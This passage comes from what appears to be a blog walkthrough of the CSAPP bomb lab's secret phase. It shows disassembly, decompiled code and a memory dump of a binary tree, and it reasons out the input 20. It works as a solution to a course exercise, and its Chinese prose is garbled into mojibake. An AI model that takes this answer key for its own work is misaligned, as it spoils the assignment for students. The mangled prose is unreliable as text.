class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Curses, you&#x27;ve found the secret phase!&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;But finding it and solving it are quite different...&quot;</span>);</span><br><span class="line">      <span class="built_in">secret_phase</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble phase_defused</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_defused:</span><br><span class="line">   <span class="number">0x00000000004015c4</span> &lt;+<span class="number">0</span>&gt;:     sub    rsp,<span class="number">0x78</span></span><br><span class="line">   <span class="number">0x00000000004015c8</span> &lt;+<span class="number">4</span>&gt;:     mov    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x00000000004015d1</span> &lt;+<span class="number">13</span>&gt;:    mov    QWORD PTR [rsp+<span class="number">0x68</span>],rax</span><br><span class="line">   <span class="number">0x00000000004015d6</span> &lt;+<span class="number">18</span>&gt;:    <span class="keyword">xor</span>    eax,eax</span><br><span class="line">   <span class="number">0x00000000004015d8</span> &lt;+<span class="number">20</span>&gt;:    cmp    DWORD PTR [rip+<span class="number">0x202181</span>],<span class="number">0x6</span>        # <span class="number">0x603760</span> &lt;num_input_strings&gt;</span><br><span class="line">   <span class="number">0x00000000004015df</span> &lt;+<span class="number">27</span>&gt;:    jne    <span class="number">0x40163f</span> &lt;phase_defused+<span class="number">123</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004015e1</span> &lt;+<span class="number">29</span>&gt;:    lea    r8,[rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x00000000004015e6</span> &lt;+<span class="number">34</span>&gt;:    lea    rcx,[rsp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x00000000004015eb</span> &lt;+<span class="number">39</span>&gt;:    lea    rdx,[rsp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00000000004015f0</span> &lt;+<span class="number">44</span>&gt;:    mov    esi,<span class="number">0x402619</span></span><br><span class="line">   <span class="number">0x00000000004015f5</span> &lt;+<span class="number">49</span>&gt;:    mov    edi,<span class="number">0x603870</span></span><br><span class="line">   <span class="number">0x00000000004015fa</span> &lt;+<span class="number">54</span>&gt;:    call   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   <span class="number">0x00000000004015ff</span> &lt;+<span class="number">59</span>&gt;:    cmp    eax,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x0000000000401602</span> &lt;+<span class="number">62</span>&gt;:    jne    <span class="number">0x401635</span> &lt;phase_defused+<span class="number">113</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401604</span> &lt;+<span class="number">64</span>&gt;:    mov    esi,<span class="number">0x402622</span></span><br><span class="line">   <span class="number">0x0000000000401609</span> &lt;+<span class="number">69</span>&gt;:    lea    rdi,[rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x000000000040160e</span> &lt;+<span class="number">74</span>&gt;:    call   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">   <span class="number">0x0000000000401613</span> &lt;+<span class="number">79</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x0000000000401615</span> &lt;+<span class="number">81</span>&gt;:    jne    <span class="number">0x401635</span> &lt;phase_defused+<span class="number">113</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401617</span> &lt;+<span class="number">83</span>&gt;:    mov    edi,<span class="number">0x4024f8</span></span><br><span class="line">   <span class="number">0x000000000040161c</span> &lt;+<span class="number">88</span>&gt;:    call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401621</span> &lt;+<span class="number">93</span>&gt;:    mov    edi,<span class="number">0x402520</span></span><br><span class="line">   <span class="number">0x0000000000401626</span> &lt;+<span class="number">98</span>&gt;:    call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040162b</span> &lt;+<span class="number">103</span>&gt;:   mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401630</span> &lt;+<span class="number">108</span>&gt;:   call   <span class="number">0x401242</span> &lt;secret_phase&gt;</span><br><span class="line">   <span class="number">0x0000000000401635</span> &lt;+<span class="number">113</span>&gt;:   mov    edi,<span class="number">0x402558</span></span><br><span class="line">   <span class="number">0x000000000040163a</span> &lt;+<span class="number">118</span>&gt;:   call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040163f</span> &lt;+<span class="number">123</span>&gt;:   mov    rax,QWORD PTR [rsp+<span class="number">0x68</span>]</span><br><span class="line">   <span class="number">0x0000000000401644</span> &lt;+<span class="number">128</span>&gt;:   <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x000000000040164d</span> &lt;+<span class="number">137</span>&gt;:   je     <span class="number">0x401654</span> &lt;phase_defused+<span class="number">144</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040164f</span> &lt;+<span class="number">139</span>&gt;:   call   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401654</span> &lt;+<span class="number">144</span>&gt;:   add    rsp,<span class="number">0x78</span></span><br><span class="line">   <span class="number">0x0000000000401658</span> &lt;+<span class="number">148</span>&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><aside>ğŸ’¡ ç¬”è®°ï¼šcmp    DWORD PTR [rip+0x202181],0x6  ä¸­ rip ä½¿ç”¨çš„æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</aside><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%203.png" alt="Untitled"></p><h2 id="Part-s-2-secret-phase">Part s.2 secret_phase</h2><p>ä½¿ç”¨strtol()è§£æè¾“å…¥ï¼Œè¾“å…¥ç¬¬ä¸€éƒ¨åˆ†çš„æ•°å­—ä¸èƒ½å¤§äº1000ï¼Œä¸”ä¼ åˆ°<code>fun7()</code>åè¿”å›å€¼å¿…é¡»ä¸º2.</p><p>åç¼–è¯‘ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">secret_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">read_line</span>();</span><br><span class="line">  v1 = <span class="built_in">strtol</span>(v0, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 - <span class="number">1</span> &gt; <span class="number">1000</span> )</span><br><span class="line">    ((<span class="built_in">void</span> (*)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, ...))explode_bomb)(v0, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">fun7</span>((__int64)&amp;n1, v1) != <span class="number">2</span> )</span><br><span class="line">    ((<span class="built_in">void</span> (*)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">char</span> *, ...))explode_bomb)(&amp;n1, (<span class="type">const</span> <span class="type">char</span> *)v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow! You&#x27;ve defused the secret stage!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">phase_defused</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åæ±‡ç¼–ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">dump of assembler code <span class="keyword">for</span> function secret_phase:</span><br><span class="line">   <span class="number">0x0000000000401242</span> &lt;+<span class="number">0</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x0000000000401243</span> &lt;+<span class="number">1</span>&gt;:     call   <span class="number">0x40149e</span> &lt;read_line&gt;</span><br><span class="line">   <span class="number">0x0000000000401248</span> &lt;+<span class="number">6</span>&gt;:     mov    edx,<span class="number">0xa</span></span><br><span class="line">   <span class="number">0x000000000040124d</span> &lt;+<span class="number">11</span>&gt;:    mov    esi,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401252</span> &lt;+<span class="number">16</span>&gt;:    mov    rdi,rax</span><br><span class="line">   <span class="number">0x0000000000401255</span> &lt;+<span class="number">19</span>&gt;:    call   <span class="number">0x400bd0</span> &lt;strtol@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040125a</span> &lt;+<span class="number">24</span>&gt;:    mov    rbx,rax</span><br><span class="line">   <span class="number">0x000000000040125d</span> &lt;+<span class="number">27</span>&gt;:    lea    eax,[rax<span class="number">-0x1</span>]</span><br><span class="line">   <span class="number">0x0000000000401260</span> &lt;+<span class="number">30</span>&gt;:    cmp    eax,<span class="number">0x3e8</span></span><br><span class="line">   <span class="number">0x0000000000401265</span> &lt;+<span class="number">35</span>&gt;:    jbe    <span class="number">0x40126c</span> &lt;secret_phase+<span class="number">42</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401267</span> &lt;+<span class="number">37</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040126c</span> &lt;+<span class="number">42</span>&gt;:    mov    esi,ebx</span><br><span class="line">   <span class="number">0x000000000040126e</span> &lt;+<span class="number">44</span>&gt;:    mov    edi,<span class="number">0x6030f0</span></span><br><span class="line">   <span class="number">0x0000000000401273</span> &lt;+<span class="number">49</span>&gt;:    call   <span class="number">0x401204</span> &lt;fun7&gt;</span><br><span class="line">   <span class="number">0x0000000000401278</span> &lt;+<span class="number">54</span>&gt;:    cmp    eax,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040127b</span> &lt;+<span class="number">57</span>&gt;:    je     <span class="number">0x401282</span> &lt;secret_phase+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040127d</span> &lt;+<span class="number">59</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401282</span> &lt;+<span class="number">64</span>&gt;:    mov    edi,<span class="number">0x402438</span></span><br><span class="line">   <span class="number">0x0000000000401287</span> &lt;+<span class="number">69</span>&gt;:    call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040128c</span> &lt;+<span class="number">74</span>&gt;:    call   <span class="number">0x4015c4</span> &lt;phase_defused&gt;</span><br><span class="line">   <span class="number">0x0000000000401291</span> &lt;+<span class="number">79</span>&gt;:    pop    rbx</span><br><span class="line">   <span class="number">0x0000000000401292</span> &lt;+<span class="number">80</span>&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Part-s-3-func7">Part s.3 func7</h2><p>æœ€åä¸€æ­¥çš„éš¾ç‚¹æ˜¯çœ‹å‡ºæ¥è¿™æ˜¯åœ¨äºŒå‰æ ‘ä¸Šè¿›è¡Œè¿ç®—ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">0x401273</span> &lt;secret_phase+<span class="number">49</span>&gt;    call   fun7                      &lt;fun7&gt;</span><br><span class="line">        rdi: <span class="number">0x6030f0</span> (n1) â—‚â€” <span class="number">0x24</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line">        rsi: <span class="number">0x29a</span></span><br><span class="line">        rdx: <span class="number">0x0</span></span><br><span class="line">        rcx: <span class="number">0x603963</span> (input_strings+<span class="number">483</span>) â€”â–¸ <span class="number">0x616b6a</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemb fun7</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function fun7:</span><br><span class="line">   <span class="number">0x0000000000401204</span> &lt;+<span class="number">0</span>&gt;:     sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000401208</span> &lt;+<span class="number">4</span>&gt;:     test   rdi,rdi</span><br><span class="line">   <span class="number">0x000000000040120b</span> &lt;+<span class="number">7</span>&gt;:     je     <span class="number">0x401238</span> &lt;fun7+<span class="number">52</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040120d</span> &lt;+<span class="number">9</span>&gt;:     mov    edx,DWORD PTR [rdi]</span><br><span class="line">   <span class="number">0x000000000040120f</span> &lt;+<span class="number">11</span>&gt;:    cmp    edx,esi</span><br><span class="line">   <span class="number">0x0000000000401211</span> &lt;+<span class="number">13</span>&gt;:    jle    <span class="number">0x401220</span> &lt;fun7+<span class="number">28</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401213</span> &lt;+<span class="number">15</span>&gt;:    mov    rdi,QWORD PTR [rdi+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401217</span> &lt;+<span class="number">19</span>&gt;:    call   <span class="number">0x401204</span> &lt;fun7&gt;</span><br><span class="line">   <span class="number">0x000000000040121c</span> &lt;+<span class="number">24</span>&gt;:    add    eax,eax</span><br><span class="line">   <span class="number">0x000000000040121e</span> &lt;+<span class="number">26</span>&gt;:    jmp    <span class="number">0x40123d</span> &lt;fun7+<span class="number">57</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401220</span> &lt;+<span class="number">28</span>&gt;:    mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401225</span> &lt;+<span class="number">33</span>&gt;:    cmp    edx,esi</span><br><span class="line">   <span class="number">0x0000000000401227</span> &lt;+<span class="number">35</span>&gt;:    je     <span class="number">0x40123d</span> &lt;fun7+<span class="number">57</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401229</span> &lt;+<span class="number">37</span>&gt;:    mov    rdi,QWORD PTR [rdi+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x000000000040122d</span> &lt;+<span class="number">41</span>&gt;:    call   <span class="number">0x401204</span> &lt;fun7&gt;</span><br><span class="line">   <span class="number">0x0000000000401232</span> &lt;+<span class="number">46</span>&gt;:    lea    eax,[rax+rax*<span class="number">1</span>+<span class="number">0x1</span>]</span><br><span class="line">   <span class="number">0x0000000000401236</span> &lt;+<span class="number">50</span>&gt;:    jmp    <span class="number">0x40123d</span> &lt;fun7+<span class="number">57</span>&gt;</span><br><span class="line">---------------------------- å¦‚æœrdi == <span class="number">0</span> å°±è¿”å›<span class="number">0xffffffff</span></span><br><span class="line">   <span class="number">0x0000000000401238</span> &lt;+<span class="number">52</span>&gt;:    mov    eax,<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040123d</span> &lt;+<span class="number">57</span>&gt;:    add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000401241</span> &lt;+<span class="number">61</span>&gt;:    ret</span><br><span class="line">End of assembler dump</span><br></pre></td></tr></table></figure><p>secretä¸­å°†0x6030f0ä¼ ç»™rdiï¼Œrdiä¸ºå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¯ä»¥æŸ¥çœ‹ä¸‹0x6030f0çš„å†…å®¹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">80</span>gx <span class="number">0x6030f0</span></span><br><span class="line"><span class="number">0x6030f0</span> &lt;n1&gt;:  <span class="number">0x0000000000000024</span>      <span class="number">0x0000000000603110</span></span><br><span class="line"><span class="number">0x603100</span> &lt;n1+<span class="number">16</span>&gt;:       <span class="number">0x0000000000603130</span>      <span class="number">0x00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0x603110</span> &lt;n21&gt;: <span class="number">0x0000000000000008</span>      <span class="number">0x0000000000603190</span></span><br><span class="line"><span class="number">0x603120</span> &lt;n21+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603150</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603130</span> &lt;n22&gt;: <span class="number">0x0000000000000032</span>      <span class="number">0x0000000000603170</span></span><br><span class="line"><span class="number">0x603140</span> &lt;n22+<span class="number">16</span>&gt;:      <span class="number">0x00000000006031b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603150</span> &lt;n32&gt;: <span class="number">0x0000000000000016</span>      <span class="number">0x0000000000603270</span></span><br><span class="line"><span class="number">0x603160</span> &lt;n32+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603230</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603170</span> &lt;n33&gt;: <span class="number">0x000000000000002d</span>      <span class="number">0x00000000006031d0</span></span><br><span class="line"><span class="number">0x603180</span> &lt;n33+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603290</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603190</span> &lt;n31&gt;: <span class="number">0x0000000000000006</span>      <span class="number">0x00000000006031f0</span></span><br><span class="line"><span class="number">0x6031a0</span> &lt;n31+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603250</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031b0</span> &lt;n34&gt;: <span class="number">0x000000000000006b</span>      <span class="number">0x0000000000603210</span></span><br><span class="line"><span class="number">0x6031c0</span> &lt;n34+<span class="number">16</span>&gt;:      <span class="number">0x00000000006032b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031d0</span> &lt;n45&gt;: <span class="number">0x0000000000000028</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031e0</span> &lt;n45+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031f0</span> &lt;n41&gt;: <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603200</span> &lt;n41+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603210</span> &lt;n47&gt;: <span class="number">0x0000000000000063</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603220</span> &lt;n47+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603230</span> &lt;n44&gt;: <span class="number">0x0000000000000023</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603240</span> &lt;n44+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603250</span> &lt;n42&gt;: <span class="number">0x0000000000000007</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603260</span> &lt;n42+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603270</span> &lt;n43&gt;: <span class="number">0x0000000000000014</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603280</span> &lt;n43+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603290</span> &lt;n46&gt;: <span class="number">0x000000000000002f</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032a0</span> &lt;n46+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032b0</span> &lt;n48&gt;: <span class="number">0x00000000000003e9</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032c0</span> &lt;n48+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:       <span class="number">0x000000010000014c</span>      <span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:       <span class="number">0x00000002000000a8</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:       <span class="number">0x000000030000039c</span>      <span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:       <span class="number">0x00000004000002b3</span>      <span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:       <span class="number">0x00000005000001dd</span>      <span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:       <span class="number">0x00000006000001bb</span>      <span class="number">0x0000000000</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹è¿™é‡Œå­˜æ”¾ç€äºŒå‰æ ‘ï¼Œç»“æ„å¯èƒ½ä¸ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">long</span> val;           </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *l,*r; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ¯ä¸ªnodeåè¡¥äº†8ä¸ªå­—èŠ‚ï¼Œå¯èƒ½æ˜¯ä¸ºäº†å†…å­˜å¯¹é½</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ ¹æ®è¿™äº›nç”»å‡ºå®Œæ•´çš„äºŒå‰æ ‘ï¼Œä½†äººå·¥ç”»æœ‰ç‚¹éº»çƒ¦ï¼Œä¸å¦‚å…ˆæ€è€ƒæ€æ ·å¾—åˆ°æ‰€éœ€çš„è¿”å›å€¼2ã€‚</p><p>IDAåç¼–è¯‘ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">fun7</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 &gt; (<span class="type">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">fun7</span>(*(_QWORD *)(a1 + <span class="number">8</span>), a2);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 != (_DWORD)a2 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">fun7</span>(*(_QWORD *)(a1 + <span class="number">16</span>), a2) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1(rdi)å…¶å®æ˜¯äºŒå‰æ ‘çš„æ ¹ï¼Œa1+8å¯¹åº”å·¦å­æ ‘ï¼Œa1+16å¯¹åº”å³å­æ ‘ã€‚</p><p>è‹¥è®¿é—®åˆ°ç©ºèŠ‚ç‚¹ï¼Œåˆ™è¿”å›å€¼ä¼šå‡ºç°<code>0xffffffff</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½åœ¨æ ‘ä¸Šï¼ˆè½¯ä»¶åŸå› æ ‘çš„æœ€å³åˆ†ææœªè¡¥å…¨ï¼‰çš„èŠ‚ç‚¹é€‰æ‹©ã€‚é€šè¿‡ä»£ç æˆ‘ä»¬çŸ¥é“ï¼Œè‹¥ä»èŠ‚ç‚¹<code>x</code>å‡ºå‘<code>result</code>åˆå§‹å€¼ä¸º<code>0</code>ï¼Œè‹¥æ”¹èŠ‚ç‚¹ä¸ºå³å„¿å­åˆ™<code>a=2*a+1</code>ã€ä¸ºå·¦å„¿å­åˆ™<code>a=a*2</code>ã€‚</p><p>ç”±äº2 = 2 * 1ï¼Œæ‰€ä»¥éœ€è¦çš„èŠ‚ç‚¹xæ»¡è¶³ï¼Œxæ˜¯å…¶çˆ¶èŠ‚ç‚¹yçš„å³å„¿å­ï¼Œyæ˜¯æ ¹èŠ‚ç‚¹a1ï¼ˆrsiï¼‰çš„å·¦å„¿å­ã€‚</p><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%204.png" alt="Untitled"></p><p>æ‰€ä»¥è¾“å…¥20ï¼ˆæˆ–è€…0x603150çš„å·¦å„¿å­ï¼‰å°±è¡Œã€‚</p><h1 id="ç¬”è®°">ç¬”è®°</h1><ul><li>ä¸å°å¿ƒæŒ‰ctrl-zæŠŠè¿›ç¨‹suspendäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>jobs</code>æŸ¥è¯¢å½“å‰å·¥ä½œï¼Œç„¶å<code>fg N (bash)</code> æˆ– <code>fg %N(zsh)</code> å°†ä»»åŠ¡ä»åå°è½¬å…¥å‰å°</li></ul><h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1><ul><li>Introduction to 